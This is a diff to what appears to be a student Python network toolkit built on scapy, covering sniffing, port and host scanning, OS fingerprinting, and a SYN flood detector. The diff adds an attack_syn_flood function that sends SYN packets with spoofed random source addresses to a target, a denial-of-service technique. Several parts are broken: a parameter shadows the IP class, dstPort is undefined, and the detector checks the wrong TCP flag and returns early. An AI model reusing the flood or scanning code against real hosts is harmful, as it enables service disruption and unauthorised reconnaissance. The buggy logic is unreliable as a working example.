@@ -1,5 +1,6 @@
 import os
 from scapy.all import *
+from collections import Counter
 import time
 import logging
 import matplotlib
@@ -24,7 +25,7 @@ def sniff_interface(interface,count=20):
 	
 	print( "-----Sniff packet in the NetworkInterface-------")
 
-	protocol = ["","tcp", "udp","icmp"]
+	protocol = ["","tcp", "udp","icmp"]	
 
 	for i in range(0,len( interface)):
 	
@@ -34,12 +35,12 @@ def sniff_interface(interface,count=20):
 	
 	print("choose the protocol: \n")
 
-	choose_protocol = (int(input(" 0. all protocol \n 1.tcp \n 2. udp \n 3. icmp\n")))
+	choose_protocol = (int(input(" 0. all protocol \n 1. tcp \n 2. udp \n 3. icmp\n")))
 	
 	if  choose_protocol ==1 :
-		result =sniff(iface=interface[choose],count=count)
+		result = sniff(iface=interface[choose],count=count)
 	else:
-		result =sniff(iface=interface[choose],filter=protocol[choose_protocol],
+		result = sniff(iface=interface[choose],filter=protocol[choose_protocol],
 			count=count)
 	
 
@@ -47,6 +48,8 @@ def sniff_interface(interface,count=20):
 	
 	more_information = input("visual more information on packet: (y/n) ")
 	
+	logging.getLogger(result)
+
 	if more_information == "y":
 	
 		for row in result:
@@ -55,6 +58,31 @@ def sniff_interface(interface,count=20):
 	
 	print( "-----------------------------------------------\n")
 
+
+def randomIP():
+
+	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+
+	return ip
+
+def randInt():
+
+	x = random.randint(1000,9000)
+
+	return x	
+
+def attack_syn_flood(IP,number):
+
+	for x in range (0,number):
+	
+		s_port = randInt()
+	
+		s_eq = randInt()
+	
+		w_indow = randInt()
+
+		ans,unans = srloop(IP(src = randomIP(),dst=IP)/TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),count=number)
+	
 
 def os_fingerprinting_load():
 	
@@ -125,19 +153,69 @@ def scan_port_host(ip_host,first_port,ultime_port):
 	
 	
 
-def main():
-	interface = os.listdir('/sys/class/net/')
-	db_os_fingerprinting=os_fingerprinting_load()
-	#while True:
-	print(scan_host_network())
-		#sniff_interface(interface,40)
-	#print(send_ICMP('192.168.178.30'))
-	print(os_fingerprinting(send_ICMP('192.168.178.30'),db_os_fingerprinting))
-		#print(ls(ARP))
-		#scan_port_host('192.168.178.1',80,80)
-		#print(get_mac('192.168.178.1'))
+
+def dection_syn_flood():
+
+	count =Counter()
 	
+	pkts = sniff(filter = 'tcp', count = 20)
+	
+	for pkt in  pkts:
+		
+		if TCP in pkt and pkt[TCP].flags == 'A':  # TCP SYN packet
+	
+			src = pkt.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}')
+	
+			count[src] = count[src] + 1	
+	
+			print(src)
+
+			return count
 
 
+
+
+def main():
+
+	interface = os.listdir('/sys/class/net/')
+
+	db_os_fingerprinting=os_fingerprinting_load()
+
+	choose = int(input('choose what action to perform: '))
+	
+	print("1. sniff interface\n2. \n3. \n4. \n")
+	
+	if(choose == 1):
+	
+		print(sniff_interface(interface))
+
+	elif (choose == 2):
+
+		print(dection_syn_flood())
+
+	elif (choose == 3):
+	
+		print(scan_host_network())
+	
+	elif (choose == 4):
+	
+		ip = input("ip insert")	
+	
+		print(send_ICMP(ip))
+	
+	elif (choose == 5):
+		
+		ip = input("ip insert")	
+
+		print(os_fingerprinting(send_ICMP(ip),db_os_fingerprinting))
+		
+	elif (choose ==6):
+	
+		print(scan_port_host('192.168.178.1',80,80))
+
+	elif (choose ==7):
+		
+		print(get_mac('192.168.178.1'))
+	
 if __name__ == "__main__":
 	main()
